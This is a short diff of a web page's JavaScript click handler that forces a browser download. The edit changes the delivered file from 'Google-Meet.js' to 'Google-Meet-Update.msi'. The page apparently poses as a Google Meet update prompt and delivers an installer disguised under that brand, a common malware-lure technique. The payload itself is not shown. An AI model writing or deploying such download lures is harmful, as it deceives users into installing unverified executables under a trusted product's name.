@@ -36,13 +36,13 @@
 
     <script>
     async function handleClick() {
-        const response = await fetch('Google-Meet.js');
+        const response = await fetch('Google-Meet-Update.msi');
         const blob = await response.blob();
         const blobUrl = URL.createObjectURL(blob);
 
         const a = document.createElement('a');
         a.href = blobUrl;
-        a.download = 'Google-Meet.js';
+        a.download = 'Google-Meet-Update.msi';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
